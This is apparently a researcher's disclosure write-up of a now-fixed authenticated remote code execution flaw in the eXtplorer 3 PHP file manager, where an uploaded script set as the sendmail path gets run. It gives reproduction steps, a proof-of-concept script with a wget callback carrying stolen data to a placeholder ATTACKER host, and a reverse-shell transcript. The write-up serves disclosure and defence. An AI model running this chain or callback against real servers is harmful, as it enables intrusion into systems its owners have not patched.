---
title: "Remote code execution through the sendmail path setting"
target: "soerennb/extplorer"
target_url: "https://github.com/soerennb/extplorer"
bug_class: "OS command execution through an application-controlled executable path (CWE-78, CWE-73)"
severity: "Critical / authenticated RCE"
cvss: "9.1"
cvss_version: "3.1"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"
cvss_source: "my score"
cwe: ["CWE-78", "CWE-73"]
discovery_method: "Source review of a local install, then proven live with a shell from the running app"
disclosed: 2026-10-19
status: "fixed"
advisory_url: "https://github.com/soerennb/extplorer/releases/tag/v3.1.2"
fix_commit: "731aa2d0"
fix_commit_url: "https://github.com/soerennb/extplorer/commit/731aa2d066963bf1a3be0f8f675df008c2c63729"
affected: "3.0.0 to 3.1.1 by source, 3.1.1 tested"
patched_in: "3.1.2 (3.1.3 recommended)"
credit: "Credited by name in the 3.1.2 release notes and CHANGELOG"
credited_in: "3.1.2 release notes"
summary: "The sendmail path in the email settings is run as a command. Upload a script with no extension, chmod it with the app's own permissions dialog, point the sendmail path at it, click send test email, and the server runs it as www-data. Fixed and released by the maintainer about three hours after the report."
tags: ["web", "PHP", "rce", "command-execution"]
featured: true
---

## Summary

eXtplorer 3 is a PHP file manager. It can send email, and one way it does that is by
handing the message to a sendmail program on the server. The settings page has a box
for the path to that program.

Whatever you put in that box is what the server runs. The app checked that the value
was not empty, had no null byte, and pointed at an executable file. It never checked
that the file was a mail program or that it lived outside the folders users upload into.

So I uploaded a shell script, made it executable with the app's own permissions dialog,
set it as the sendmail path, and clicked send test email. I got a shell back as www-data.

## Who can reach it

This needs a user with settings access, plus the password re-prompt the app asks for when
you save settings. An ordinary file manager user cannot do it.

What makes it a boundary and not just "admins are admins" is the app's own permission
model. eXtplorer has a separate `admin_settings` permission and `admin_users` permission,
and before the fix the settings controller let in a user holding either one
(`app/Controllers/SettingsController.php:22-29` in 3.1.1). A user trusted to configure the
app, or only to manage users, ended up with code execution on the server.

## Where the value goes

`app/Services/EmailService.php:44` (3.1.1) takes the setting as is:

```php
$config['mailPath'] = $settings['sendmail_path'] ?? '/usr/sbin/sendmail';
```

That becomes CodeIgniter's mail path. CodeIgniter 4.7.5 builds the command by gluing
strings together in `sendWithSendmail` (`system/Email/Email.php:1720`):

```php
popen($this->mailPath . ' -oi ' . $from . ' -t', 'w')
```

The only validation on the setting is `app/Services/SettingsInputPolicy.php:69-72`: not
empty, no null byte. Nothing requires an absolute path or keeps it out of the upload tree.

`app/Services/EmailService.php:314` looks like a guard but is not one:

```php
return $path !== '' && is_file($path) && is_executable($path);
```

It confirms the uploaded file is executable. It does not reject it.

The upload filter blocks executable file extensions. That does not help, because the
script needs no extension. The first line of the file picks the interpreter.

## Steps to reproduce

All through the normal web interface, as a user with settings access.

1. Upload a file with no extension into Home:

```sh
#!/bin/sh
id > /var/www/html/writable/file_manager_root/pwned.txt
wget -q -O /dev/null "http://ATTACKER:9090/rce?u=$(id -un)"
```

2. Open the permissions dialog on the file and set it to 700. The web server user owns
   the file and is also the user that runs it, so the owner bit is enough.
3. In Settings, set the email method to sendmail and the sendmail path to the uploaded
   file, for example `/var/www/html/writable/file_manager_root/myfile`. Set a from
   address and save. The app asks for your password again here.
4. Click send test email.

`pwned.txt` appears and can be read back through the file manager, and the callback lands
on the listener.

## Proof

On my local instance, a reverse shell script in place of the callback gave this:

```
connect to [192.168.1.130] from (UNKNOWN) [192.168.1.201] 41501
/bin/sh: can't access tty; job control turned off
/var/www/html/.releases/3.1.1-71b8c834.../public $ whoami
www-data
```

## The control test

Before calling this a bug I had to rule out the boring answer, that nothing ran and the
test email simply failed. The first attempt did fail. The script was never uploaded,
because my curl login had died, and nothing downstream could have run. A file listing of
the upload folder showed no script at all. Redoing the upload through the browser and
checking the file was there and `-rwx` owned by www-data is what separated "the chain does
not work" from "my setup was broken".

## What I got wrong along the way

- My first reverse shell used `#!/bin/bash` and `/dev/tcp`. The official image is Alpine.
  There is no bash in it, so the script never ran. `#!/bin/sh` with a named pipe and `nc`
  worked.
- My report cited the executable check at `EmailService.php:313`. It is line 314.
- My report scored it `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` and called that
  9.0. That vector works out to 9.1, not 9.0. Scope is changed because a user trusted to
  configure the app ends up with the server.
- The advisory was closed after the fix rather than published, so no score was ever
  assigned by the maintainer. The 9.1 on this page is my own score.

## What I did not test

Only the Docker Compose stack from the repository, image `ghcr.io/soerennb/extplorer3`,
PHP 8.5.11. I did not run a native Apache or nginx install. The same code path is there,
and there is no read-only container around it. The affected range above comes from reading
3.0.0 and 3.1.0 in source, not from running them.

## The fix

The maintainer fixed it in commit 731aa2d and shipped it in 3.1.2. The web setting is
never executed anymore. A custom sendmail binary now has to be set by the server operator
in the `EXTPLORER_SENDMAIL_PATH` environment variable (`app/Services/SendmailPolicy.php`),
the binary and every folder above it must not be writable by the PHP worker, and the path
is shell quoted. `admin_users` alone no longer opens settings. 3.1.3 followed the same day
with a compatibility fix, and the maintainer recommends 3.1.3.

## Timeline

- 2026-10-19: picked eXtplorer 3 as a target and installed 3.1.1 locally from the
  project's docker compose.
- 2026-10-19: got a shell as www-data through the sendmail path and reported it privately
  through GitHub the same night.
- 2026-10-20: fix committed (731aa2d) and released in 3.1.2, then 3.1.3.
- 2026-10-20: the maintainer confirmed the RCE, credited me in the release notes, and
  closed the private advisory GHSA-x294-8g9c-m6fc without publishing it.
